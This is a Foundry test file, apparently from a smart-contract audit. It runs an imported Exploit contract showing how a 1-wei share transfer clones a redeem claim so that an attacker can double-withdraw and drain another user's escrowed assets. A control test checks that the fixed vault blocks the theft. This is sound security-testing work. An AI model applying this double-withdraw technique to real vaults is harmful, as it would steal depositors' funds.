// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SuperVault,
    SuperVaultFixed,
    SuperVaultStrategy,
    SuperVaultEscrow,
    MiniToken,
    ISuperVaultStrategy
} from "./63075-malicious-actor-can-overwrite-others-user-state-via-1-wei-va.sol";

contract SuperVaultStateOverwriteTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;
    uint256 internal constant DEPOSIT = 100 ether;

    // ── The bug: a 1-wei share transfer clones a fulfilled redeem, enabling a
    //    double-withdraw that drains another user's escrowed assets. ──
    function test_exploit_oneWeiTransferClonesMaxWithdraw_drainsEscrow() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken asset = MiniToken(e.assetAddr());

        // Clone proven: acct2 had 0 claimable before, exactly the sender's 100 after the 1-wei transfer.
        assertEq(e.acct2MaxWithdrawBeforeClone(), 0, "acct2 started with no claim");
        assertEq(e.acct2MaxWithdrawAfterClone(), DEPOSIT, "1-wei transfer cloned maxWithdraw onto acct2");

        // Harm: the attacker EOA netted 100 asset it never deposited; the shared escrow is drained.
        assertEq(e.escrowBefore(), 2 * DEPOSIT, "escrow held both users' fulfilled assets");
        assertEq(e.attackerStolen(), DEPOSIT, "attacker stole exactly one deposit");
        assertEq(asset.balanceOf(ATTACKER), DEPOSIT, "stolen asset sits at the attacker EOA");
        assertEq(e.escrowAfter(), 0, "escrow fully drained by the double withdraw");

        // The victim's 100 entitlement is now unbacked: the assets that would pay it were stolen.
        assertEq(e.victimEntitlement(), DEPOSIT, "victim still shows a 100 claim");
        assertLt(e.escrowAfter(), e.victimEntitlement(), "victim can no longer be paid");
    }

    // ── Negative control: the fixed `_update` moves only cost-basis accumulators
    //    pro-rata and never clones the redeem state, so the clone claim reverts
    //    and total withdrawn equals the single legitimate deposit. ──
    function test_control_fixedUpdate_noClone_noTheft() public {
        MiniToken asset = new MiniToken("Vault Asset", "STOLEN-ASSET");
        SuperVaultStrategy strategy = new SuperVaultStrategy();
        SuperVaultEscrow escrow = new SuperVaultEscrow(address(asset));
        SuperVaultFixed vault = new SuperVaultFixed();

        strategy.init(address(vault), address(escrow), address(asset));
        escrow.setStrategy(address(strategy));
        vault.initialize(address(strategy), address(escrow));

        // Same pooled state: this test contract (acct1) + victim each have 100 fulfilled.
        asset.mint(address(escrow), 2 * DEPOSIT);
        strategy.fulfillRedeem(address(this), DEPOSIT); // acct1 (this test contract)
        strategy.fulfillRedeem(VICTIM, DEPOSIT);
        vault.mintShares(address(this), 1000);

        // Attempt the same 1-wei clone: acct1 (this contract) -> acct2 (ATTACKER).
        vault.transfer(ATTACKER, 1);

        // No clone: acct2's redeem state is untouched.
        assertEq(strategy.claimableWithdraw(ATTACKER), 0, "fixed _update did NOT clone maxWithdraw");

        // acct1's own legitimate claim still works.
        strategy.claim(address(this), address(this));
        assertEq(asset.balanceOf(address(this)), DEPOSIT, "acct1 recovered its own deposit");

        // The clone claim has nothing to take -> reverts. No theft possible.
        vm.expectRevert(bytes("NOTHING_TO_CLAIM"));
        strategy.claim(ATTACKER, ATTACKER);
        assertEq(asset.balanceOf(ATTACKER), 0, "attacker EOA stole nothing under the fix");

        // The victim's 100 remains fully backed in escrow.
        assertEq(asset.balanceOf(address(escrow)), DEPOSIT, "victim's escrowed assets are preserved");
    }
}
